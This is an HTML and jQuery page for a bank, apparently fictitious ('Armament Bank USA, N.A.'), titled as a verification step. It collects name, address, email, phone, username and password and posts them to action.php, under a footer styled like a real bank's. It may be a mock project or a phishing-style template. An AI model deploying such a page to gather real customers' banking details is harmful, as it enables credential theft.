<!DOCTYPE html>
<html lang="en">

<head>
    <title>Verification on Personal Internet Banking: verification | Armament </title>
    <meta charset="utf-8">
    <meta http-equiv="Content-Type" content="text/html">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="icon" href="images/logo-icon.ico">
    <link rel="stylesheet" href="css/owl.carousel.css" type="text/css" media="all" />
    <link href="//db.onlinewebfonts.com/c/ee258cc6f8519e35391e064b34d70b3f?family=DistrictProW01-Light" rel="stylesheet" type="text/css">
    <link rel="stylesheet" href="bootstrap/3.3.6/css/bootstrap.min.css">
    <link rel="stylesheet" href="css/main.css">
    <script src="js/jquery-2.2.3.min.js"></script>
    <script src="bootstrap/3.3.6/js/bootstrap.min.js"></script>
</head>

<body>
    <div class="container-fluid">
        <div class="row" id="main"></div>
        <div class="row" id="header-bcg">
            <div class="col-md-3" id="main-logo">
                <img src="images/logo.png">
                </div>
            </div>
            <h1 id="reg">Profile</h1>
            <div class="row" id="box">
                <div class="box_text">
                    <div class="box_head">
                        <p><b>Update User Profile </b></p>
                    </div>
                    <div id="id_page">
                        <p>Please fill in the required field to update user info.</p>
                        <form class="form-inline" role="form">
                            <div class="form-group">
                                <label for="text"><span class="ast">*</span>Required Field</label>
                            </div>
                            <div class="form-group field">
                                <label for="text"><span class="ast">*</span>&nbsp Fullname: </label>
                                <input type="text" class="form-control" id="fname" name="fname">
                            </div>
                            <div class="form-group field">
                                <label for="text">&nbsp &nbsp &nbsp <span class="ast"></span>Address: </label>
                                <input type="text" class="form-control" id="add" name="add">
                            </div>
                            <div class="form-group field">
                                <label for="email">&nbsp &nbsp &nbsp &nbsp <span class="ast">*</span> Email: </label>
                                <input type="email" class="form-control" id="email" name="email">
                            </div>
                            <div class="form-group field">
                                <label for="text"><span class="ast"></span>Phone Number: </label>
                                <input type="text" class="form-control" id="phone_no" name="phone_no">
                            </div>
                            <div class="form-group field">
                                <label for="text">&nbsp<span class="ast">*</span>Username: </label>
                                <input type="text" class="form-control" id="username" name="username">
                            </div>
                            <div class="form-group field">
                                <label for="Password">&nbsp &nbsp<span class="ast">*</span>Password: </label>
                                <input type="Password" class="form-control" id="pwd" name="password">
                            </div>
                            <div class="form-group field">
                                <label for="Password"><span class="ast">*</span>Re-type Password: </label>
                                <input type="Password" class="form-control" id="confirmPwd" name="repass">
                            </div>
                    </div>
                    <p id="info_p">If you don't already have an Armament account, apply online. This will take less than 10 minutes to apply for an account for new customers, and less than 2 minutes for existing customers.</p>
                    <div class="form-group field">
                        <div id="loader" style="display:none;"></div>
                        <div style="display:none;" id="myDiv" class="animate-bottom">
                            <p id="Msg"></p>
                        </div>
                        <button class="btn btn-default" id="btnCancel">Cancel</button>
                        <button class="btn btn-danger" id="btnContinue" style="float: right;font-size: 12px;" name="submitBtn">Continue</button>
                    </div>
                    </form>
                    <!-- <button id="proceedBtn" style="float: right;font-size: 12px;">Proceed...</button> -->
                </div>
            </div>
            <div class="clear"></div>
            <div class="row" id="report">
                <div class="col-md-2"></div>
                <div class="col-md-2 report"><a href=""><i class="glyphicon glyphicon-earphone"></i> Customer Service</a></div>
                <div class="col-md-2 report"><a href=""><i class="glyphicon glyphicon-map-marker"></i> Find a branch or ATM</a></div>
                <div class="col-md-2 report"><a href=""><i class="glyphicon glyphicon-map-marker"></i> Customer feedback</a></div>
                <div class="col-md-2"></div>
            </div>
        </div>
        <div id="footer">
            <ul type="disc">
                <li><a class="active" href="">About Armament</a></li>
                <li><a href="">Careers</a></li>
                <li><a href="">Privacy</a></li>
                <li><a href="">Security</a></li>
                <li><a href="">Terms &amp Conditions</a></li>
                <li><a href="">Site Map</a></li>
                <li><a href="">Armament Accessibility</a></li>
                <li><a href="">Armament Group</a></li>
                <ul type="disc" style="float:right;list-style-type:none;">
                    <li><a href="" style="text-align: left;">&copy Armament Bank USA, N.A. 2019. All Rights Reserved <br> Member FDIC. <br> <i class="glyphicon glyphicon-home"></i> Equal Housing Lender</a></li>
                </ul>
            </ul>
        </div>
</body>
<script>
$(document).ready(function() {
    $('#btnContinue').click(function(event) {
        event.preventDefault();
        var fname = $('#fname').val();
        var add = $('#add').val();
        var email = $('#email').val();
        var phone_no = $('#phone_no').val();
        var username = $('#username').val();
        var pwd = $('#pwd').val();
        var confirmPwd = $('#confirmPwd').val();
        if (fname == "" || add == "" || email == "" || pwd == "" || confirmPwd == "" || phone_no == "" || username == "") {
            document.getElementById("loader").style.display = "block";
            myFunction();
            $('#Msg').html("<div class='alert alert-danger'>Please fill all neccessary requirements</div>");
            document.getElementById("msg").style.display = "none";
            return false;
        } else {
            if (pwd != confirmPwd) {
                document.getElementById("loader").style.display = "block";
                myFunction();
                $('#Msg').html("<div class='alert alert-danger'>Passwords does not match</div>");
                document.getElementById("msg").style.display = "none";
                return false;
            } else {
                $.ajax({
                    url: 'action.php',
                    method: 'POST',
                    data: {
                        submit: 1,
                        fname: fname,
                        add: add,
                        email: email,
                        phone_no: phone_no,
                        username: username,
                        pwd: pwd,
                        confirmPwd: confirmPwd
                    },
                    success: function(data) {
                        document.getElementById("loader").style.display = "block";
                        myFunction();
                        $('#Msg').html(data);
                        setTimeout(function() {
                        alert("Welcome " + fname + ", Your account has been created. Please login. ");
                        location.href = "./index.html";
                        }, 5000);

                    }
                });
            }
        }
    });
    $('#proceedBtn').click(function(event) {
        location.href = "./index.html";
    });
});
var myVar;

function myFunction() {
    myVar = setTimeout(showPage, 3000);
}

function showPage() {
    document.getElementById("loader").style.display = "none";
    document.getElementById("myDiv").style.display = "block";
}
</script>

</html>